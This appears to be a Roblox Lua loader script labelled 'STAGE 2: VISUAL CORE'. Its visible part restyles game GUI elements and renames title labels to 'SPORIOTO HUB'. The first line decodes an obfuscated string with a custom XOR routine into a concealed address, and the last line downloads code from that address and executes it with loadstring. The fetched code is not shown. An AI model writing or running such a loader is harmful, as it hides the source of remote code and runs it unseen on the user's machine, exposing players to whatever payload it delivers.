
--[[ STAGE 2: VISUAL CORE ]]
local j7L5GYzNfQAuN3P="\009\246\247\244\246\192\212\213\251\009\000\218\018\021\003\024\004\020\006\005\024\008\024\037\039\014\030\042\017\236\032\045\044\239\049\049\051\037\050\043\052\041\057\029\049\251\049\034\056\051\060\041\052\066\067\005\068\057\066\074\010\079\077\071\049\069\053\097\100\056\074\086\072\103\114\090\083\085\093\087\069\085\112\115\096\097\100\117\106\091\077\099\077\082\124\113\110\085\085\101\104\131\031\108\111\030\032\111\113\111\061\124\100\113"local fI9TRwR4fBiuG=49 local duDSkpVtlZOU06W7Y=147 local Vyld25N20YRrO6JIl4WS6=0 local fZIdZhHSeQBH=1 local BD2Weuao4PoXp1sbRV_=28 local e6UpVgcWT9xOVksvUMD=false local nZR0NcpxNp0AALwIIC1S=bit32 and bit32.bxor if not nZR0NcpxNp0AALwIIC1S then nZR0NcpxNp0AALwIIC1S=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local eJUe7qCqh1ArL={}for OVTbrQo7Pu0YWtop=1,#j7L5GYzNfQAuN3P do local tnlp0FbCtJYUPg=string.byte(j7L5GYzNfQAuN3P,OVTbrQo7Pu0YWtop)local Z2IKawlDMgGOPtenK=(duDSkpVtlZOU06W7Y+(OVTbrQo7Pu0YWtop*fZIdZhHSeQBH)+BD2Weuao4PoXp1sbRV_)%256 if Vyld25N20YRrO6JIl4WS6==0 then tnlp0FbCtJYUPg=(tnlp0FbCtJYUPg-Z2IKawlDMgGOPtenK)%256 eJUe7qCqh1ArL[OVTbrQo7Pu0YWtop]=string.char(nZR0NcpxNp0AALwIIC1S(tnlp0FbCtJYUPg,fI9TRwR4fBiuG))else tnlp0FbCtJYUPg=nZR0NcpxNp0AALwIIC1S(tnlp0FbCtJYUPg,fI9TRwR4fBiuG)eJUe7qCqh1ArL[OVTbrQo7Pu0YWtop]=string.char((tnlp0FbCtJYUPg-Z2IKawlDMgGOPtenK)%256)end end local iDrTMkqCE8vtRuZD5=table.concat(eJUe7qCqh1ArL)if e6UpVgcWT9xOVksvUMD then iDrTMkqCE8vtRuZD5=string.reverse(iDrTMkqCE8vtRuZD5)end local qM42suXRPNZKK=iDrTMkqCE8vtRuZD5
local HubName = "SPORIOTO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(qM42suXRPNZKK))()
